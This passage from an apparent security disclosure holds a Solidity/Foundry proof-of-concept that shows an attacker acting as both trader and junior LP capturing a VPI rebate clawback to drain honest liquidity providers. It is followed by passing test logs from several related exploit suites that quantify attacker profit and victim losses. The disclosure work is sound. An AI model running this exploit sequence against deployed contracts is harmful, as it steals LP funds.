///         paid from pool cash (CfdEngineSettlementSidecar.sol:442-443), lowering LP NAV. The trader's clawback obligation
///         is backed by the trader's own locked VPI reserve and the lifetime clamp (CloseAccountingLib.sol:112-118), but
///         neither the receivable nor the reserve is in LP NAV (SECURITY.md:871-872). An attacker who is the trader and a
///         junior LP: (1) opens a short against an existing honest long and takes the rebate, (2) deposits junior at the
///         depressed NAV, (3) closes; the clamp claws back the whole rebate into the pool as Revenue (Sidecar :604-616),
///         (4) redeems with a share of the clawback that the other LPs paid. Public entry points only (TrancheVault
///         request/claim, OrderRouter commitOrder/executeOrder via the repo's LegacyOrderRouterHarness adapter,
///         OrderRouter.settleLpEpoch), mocked Pyth, deployed parameters (DeployPerpsArbitrumSepolia.s.sol:434-447).
contract VpiRebateClawbackLpEntryCapture is BasePerpTest {

    address internal constant ATT = address(0xA770_0030); // trader account, also runs its own keeper calls
    address internal constant ATT_LP = address(0xA770_0031); // attacker junior LP
    uint256 internal constant PRICE = 1e8;
    uint256 internal constant SIZE = 400_000e18; // honest long and attacker short; <= 0.4 * 1_002_000
    uint256 internal constant MARGIN = 100_000e6;
    uint256 internal constant LP_SWING = 1_500_000e6;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    /// Honest junior capital (held by this test contract together with the seeds).
    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 1_000_000e6;
    }

    /// Per-feed Pyth confidence in parts per million of price (0 = the repo mock default). The oracle shifts each
    /// execution price against the trader by confidence * adverseConfidenceMultiplierBps (PletherOracle.sol:910).
    uint256 internal confPpm;

    function _pyth(
        uint256 price
    ) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = vm.getBlockTimestamp();
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), int64(int256(price)), uint64(price * confPpm / 1e6), int32(-8), publishTime, publishTime - 1
        );
        updateData = new bytes[](1);
        updateData[0] = abi.encode(price);
    }

    function _now() internal view returns (uint256) {
        return vm.getBlockTimestamp();
    }

    /// Value of every tranche share the attacker does not hold.
    function _honestLpValue() internal view returns (uint256) {
        uint256 att = juniorVault.balanceOf(ATT_LP);
        return juniorVault.totalAssets() - (att == 0 ? 0 : juniorVault.convertToAssets(att))
            + seniorVault.totalAssets();
    }

    function _attackerWealth() internal view returns (uint256) {
        return settlementToken.balanceOf(ATT_LP) + settlementToken.balanceOf(ATT) + _settlementBalance(ATT)
            + engine.traderClaimBalanceAssets(ATT);
    }

    function _lpDeposit(
        uint256 amount
    ) internal {
        vm.startPrank(ATT_LP);
        settlementToken.approve(address(juniorVault), amount);
        uint256 id = juniorVault.requestDeposit(amount, ATT_LP, ATT_LP);
        vm.stopPrank();
        uint256 start = juniorVault.depositEpochStart(id);
        if (_now() < start) {
            vm.warp(start);
        }
        router.settleLpEpoch(_pyth(PRICE));
        uint256 claimable = juniorVault.claimableDepositRequest(id, ATT_LP);
        assertEq(claimable, amount, "deposit activated");
        vm.prank(ATT_LP);
        juniorVault.claimDeposit(id, claimable, ATT_LP, ATT_LP);
    }

    function _lpRedeemAll() internal {
        uint256 shares = juniorVault.balanceOf(ATT_LP);
        uint256 cooldownEnd = juniorVault.lastDepositTime(ATT_LP) + juniorVault.DEPOSIT_COOLDOWN();
        if (_now() < cooldownEnd) {
            vm.warp(cooldownEnd);
        }
        vm.prank(ATT_LP);
        uint256 id = juniorVault.requestRedeem(shares, ATT_LP, ATT_LP);
        vm.warp(juniorVault.depositEpochStart(id));
        router.settleLpEpoch(_pyth(PRICE));
        assertEq(juniorVault.claimableRedeemRequest(id, ATT_LP), shares, "redeem fully funded");
        vm.prank(ATT_LP);
        juniorVault.claimRedeem(id, shares, ATT_LP, ATT_LP);
    }

    address internal constant HONEST = address(0xA770_0032); // ordinary trader whose long creates the skew

    function _tradeAs(
        address who,
        CfdTypes.Side side,
        bool isClose
    ) internal {
        uint64 id = router.nextCommitId();
        vm.prank(who);
        router.commitOrder(side, SIZE, isClose ? 0 : MARGIN, 0, isClose); // market order
        vm.prank(ATT); // keeper: the attacker (bounties stay with the attacker for ATT's own orders)
        router.executeOrder(id, _pyth(PRICE));
        (uint256 size,,,,,,) = engine.positions(who);
        assertEq(size, isClose ? 0 : SIZE, isClose ? "close executed" : "open executed");
    }

    function _trade(
        bool isClose
    ) internal {
        _tradeAs(ATT, CfdTypes.Side.SHORT, isClose);
    }

    function _vpiAccrued() internal view returns (int256 v) {
        (,,,,,, v) = engine.positions(ATT);
    }

    function _lpRedeemAllAfter() internal {
        _lpRedeemAll();
    }

    /// Attack: attacker short opens against an honest long (skew-reducing -> VPI rebate paid from pool cash, NAV down;
    /// the clawback receivable is backed by the attacker's own locked VPI reserve and is NOT in NAV), attacker LP
    /// deposits at the depressed NAV, attacker closes (lifetime clamp claws back the whole rebate into the pool), LP exits.
    function _attack() internal returns (int256 openVpi) {
        _trade(false);
        openVpi = _vpiAccrued();
        _lpDeposit(LP_SWING);
        _trade(true);
        _lpRedeemAll();
    }

    /// Control on the same capital: LP deposits before the short opens (owns its share of the rebate payment too).
    function _control() internal {
        _lpDeposit(LP_SWING);
        _trade(false);
        _trade(true);
        _lpRedeemAll();
    }

    function test_RebateClawbackCapturedByEnteringLp() public {
        settlementToken.mint(ATT_LP, LP_SWING);
        _fundTrader(ATT, MARGIN + 50_000e6);
        _fundTrader(HONEST, MARGIN + 50_000e6);
        router.updateMarkPrice(_pyth(PRICE));
        _tradeAs(HONEST, CfdTypes.Side.LONG, false); // honest skew exists before the attack

        uint256 snap = vm.snapshotState();
        uint256 wealth0 = _attackerWealth();
        uint256 honest0 = _honestLpValue();
        _control();
        int256 controlAttacker = int256(_attackerWealth()) - int256(wealth0);
        int256 controlHonest = int256(_honestLpValue()) - int256(honest0);
        vm.revertToState(snap);

        wealth0 = _attackerWealth();
        honest0 = _honestLpValue();
        int256 openVpi = _attack();
        int256 attacker = int256(_attackerWealth()) - int256(wealth0);
        int256 honest = int256(_honestLpValue()) - int256(honest0);

        emit log_named_int("attacker open VPI (negative = rebate)", openVpi);
        emit log_named_int("control: attacker net", controlAttacker);
        emit log_named_int("control: honest LP value change", controlHonest);
        emit log_named_int("attack: attacker net", attacker);
        emit log_named_int("attack: honest LP value change", honest);
        assertLt(openVpi, 0, "attacker open is a VPI rebate");
        assertLt(controlAttacker, 0, "control loses (fees)");
        assertGt(attacker, 0, "attack nets positive for the attacker");
        assertLt(honest, controlHonest, "honest LPs end below the control");
    }

}
```

### Output (clean checkout, forge 1.8.5, solc 0.8.35)

```text
Ran 1 test for test/poc/vpi/VpiLpExitCapture.t.sol:VpiPureLpExit_Senior80
[PASS] test_pure_lp_exit_1h_carry() (gas: 5441921)
Logs:
  openVpi_charge: 7998400319
  lp_shares_funded_of: 1000082142701227
  lp_shares: 1000082142701227
  exiting_lp_proceeds_minus_deposit: 3924302106
  third_party_trader_pnl: -3227172001
  REMAINING_LPS_DELTA: -2589427711

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 10.41ms (3.10ms CPU time)

Ran 1 test for test/poc/vpi/VpiLpExitTiming.t.sol:VpiLpExitTiming
[PASS] test_open_seconds_before_boundary_settle_close_after() (gas: 5331495)
Logs:
  request_lead_seconds: 3600
  position_open_seconds: 31
  openVpi_charge: 7998400319
  lp_shares: 1000082142701227
  lp_shares_funded: 1000082142701227
  lp_proceeds: 1003924302106
  ATTACKER_COMBINED_PNL: 724226915
  VICTIMS_DELTA: -2543454026

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 10.75ms (2.99ms CPU time)

Ran 2 tests for test/poc/vpi/VpiLpExitCapture.t.sol:VpiLpExitCapture_NoSenior
[PASS] test_noSenior_f33_belowBreakEven() (gas: 5785067)
Logs:
  seconds_held: 0
  pool_after_open: 1503198402130
  pool_after_redeem: 1002799206968
  close_vpiDelta_preview: -1198402130
  close_fee_preview: 0
  close_realizedPnl_preview: 0
  pool_after_close: 1001843203458
  depth_at_open: 1502000000000
  skew_assets: 600000000000
  openVpi_charge: 1198402130
  openFee: 240000000
  lp_shares: 500004570603172
  lp_shares_funded: 500004570603172
  lp_deposit: 500000000000
  lp_proceeds: 500399195162
  sizeAfter: 0
  att_trader_start: 41000000000
  att_trader_end: 40517601380
  ATTACKER_COMBINED_PNL: -83203458
  victims_before: 1000999990868
  victims_after: 1000843166927
  VICTIMS_DELTA: -156823941

[PASS] test_noSenior_f50_maxSkew() (gas: 5785273)
Logs:
  seconds_held: 0
  pool_after_open: 2003598401598
  pool_after_redeem: 1002799609322
  close_vpiDelta_preview: -1598401598
  close_fee_preview: 0
  close_realizedPnl_preview: 0
  pool_after_close: 1001524435581
  depth_at_open: 2002000000000
  skew_assets: 800000000000
  openVpi_charge: 1598401598
  openFee: 320000000
  lp_shares: 1000009141206345
  lp_shares_funded: 1000009141206345
  lp_deposit: 1000000000000
  lp_proceeds: 1000798792276
  sizeAfter: 0
  att_trader_start: 51000000000
  att_trader_end: 50356772143
  ATTACKER_COMBINED_PNL: 155564419
  victims_before: 1000999990868
  victims_after: 1000524399050
  VICTIMS_DELTA: -475591818

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 11.12ms (7.46ms CPU time)

Ran 2 tests for test/poc/vpi/VpiLpExitCapture.t.sol:VpiLpExitCapture_Senior80
[PASS] test_senior80_f20junior_belowBreakEven() (gas: 5785220)
Logs:
  seconds_held: 0
  pool_after_open: 9259398400345
  pool_after_redeem: 9007949026755
  close_vpiDelta_preview: -7398400345
  close_fee_preview: 0
  close_realizedPnl_preview: 0
  pool_after_close: 9002046716165
  depth_at_open: 9252000000000
  skew_assets: 3700000000000
  openVpi_charge: 7398400345
  openFee: 1480000000
  lp_shares: 250020535675306
  lp_shares_funded: 250020535675306
  lp_deposit: 250000000000
  lp_proceeds: 251449373590
  sizeAfter: 0
  att_trader_start: 101000000000
  att_trader_end: 98023910245
  ATTACKER_COMBINED_PNL: -1526716165
  victims_before: 1000999981736
  victims_after: 1000827470790
  VICTIMS_DELTA: -172510946

[PASS] test_senior80_f50junior_maxSkew() (gas: 5785340)
Logs:
  seconds_held: 0
  pool_after_open: 10009998400319
  pool_after_redeem: 9006074098213
  close_vpiDelta_preview: -7998400319
  close_fee_preview: 0
  close_realizedPnl_preview: 0
  pool_after_close: 8999693164082
  depth_at_open: 10002000000000
  skew_assets: 4000000000000
  openVpi_charge: 7998400319
  openFee: 1600000000
  lp_shares: 1000082142701227
  lp_shares_funded: 1000082142701227
  lp_deposit: 1000000000000
  lp_proceeds: 1003924302106
  sizeAfter: 0
  att_trader_start: 101000000000
  att_trader_end: 97782533812
  ATTACKER_COMBINED_PNL: 706835918
  victims_before: 1000999981736
  victims_after: 998473918707
  VICTIMS_DELTA: -2526063029

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 12.20ms (7.40ms CPU time)

Ran 1 test for test/poc/vpi/VpiLpExitTiming_RouterPath.t.sol:VpiLpExitTiming_RouterPath
[PASS] test_M_R1E_router_path_commit_execute_settle_claim_close() (gas: 9745039)
Logs:
  request_lead_seconds: 3600
  open_status (2=Executed): 2
  open_pendingReason: 0
  open_terminalReason: 1
  close_status (2=Executed): 2
  close_pendingReason: 0
  close_terminalReason: 1
  open_order_id: 1
  close_order_id: 2
  position_open_seconds: 41
  openVpi_charge: 7998400319
  lp_shares_funded: 1000082142701227
  lp_proceeds: 1003924302106
  ATTACKER_COMBINED_PNL: 724202390
  VICTIMS_DELTA: -2543449798

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 13.80ms (6.49ms CPU time)

Ran 1 test for test/poc/vpi/VpiDepthNeutralChurn.t.sol:VpiDepthNeutralChurn
[PASS] test_DepthNeutralChurn_ExiterTakesRefundableVpi() (gas: 19614456)
Logs:
  depth_at_open: 10002000000000
  depth_at_close: 10011074098213
  open_vpi_charge: 7998400319
  close_vpi_curve_unclamped: -7991150521
  control_exiter_vs_deposit: 729779208
  control_entrant_vs_deposit: -1
  control_remaining_lp_delta: 767017308
  EXITER_vs_deposit: 3924302106
  ENTRANT_vs_deposit: -3191446447
  REMAINING_LP_delta: 773515731
  EXITER_gain_vs_control: 3194522898
  ENTRANT_loss_vs_control: 3191446446

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 21.24ms (13.65ms CPU time)

Ran 1 test for test/poc/vpi/VpiRebateClawbackLpEntryCapture.t.sol:VpiRebateClawbackLpEntryCapture
[PASS] test_RebateClawbackCapturedByEnteringLp() (gas: 24836170)
Logs:
  attacker open VPI (negative = rebate): -797767524
  control: attacker net: -320227323
  control: honest LP value change: 27323
  attack: attacker net: 158052405
  attack: honest LP value change: -478252405

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 24.68ms (17.73ms CPU time)

Ran 2 tests for test/poc/vpi/VpiChargeLpExitCapture_RouterPath.t.sol:VpiChargeLpExitCapture_RouterPath
[PASS] test_StillProfitableWith2bpsPythConfidence() (gas: 29057520)
Logs:
  pyth confidence (ppm of price): 200
  adverseConfidenceMultiplierBps: 2000
  open VPI charge, cycle 1 (USDG atoms): 1618575542
  open VPI charge, cycle 2 (USDG atoms): 1618936201
  control: attacker net (LP exits after close): -534603255
  control: honest LP value change: 174417655
  attack: attacker net after 1 cycle: 197198571
  attack: honest LP value change after 1 cycle: -557384171
  attack: attacker net after 2 cycles: 394833798
  attack: honest LP value change after 2 cycles: -1115204998

[PASS] test_VpiChargeCapturedByExitingLp_RefundedByRemainingLps() (gas: 28976686)
Logs:
  pyth confidence (ppm of price): 0
  adverseConfidenceMultiplierBps: 2000
  open VPI charge, cycle 1 (USDG atoms): 1618705035
  open VPI charge, cycle 2 (USDG atoms): 1619098411
  control: attacker net (LP exits after close): -505898331
  control: honest LP value change: 145698331
  attack: attacker net after 1 cycle: 247684739
  attack: honest LP value change after 1 cycle: -607884739
  attack: attacker net after 2 cycles: 495840582
  attack: honest LP value change after 2 cycles: -1216240582

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 29.46ms (44.20ms CPU time)

Ran 8 test suites in 30.69ms (133.66ms CPU time): 11 tests passed, 0 failed, 0 skipped (11 total tests)
```

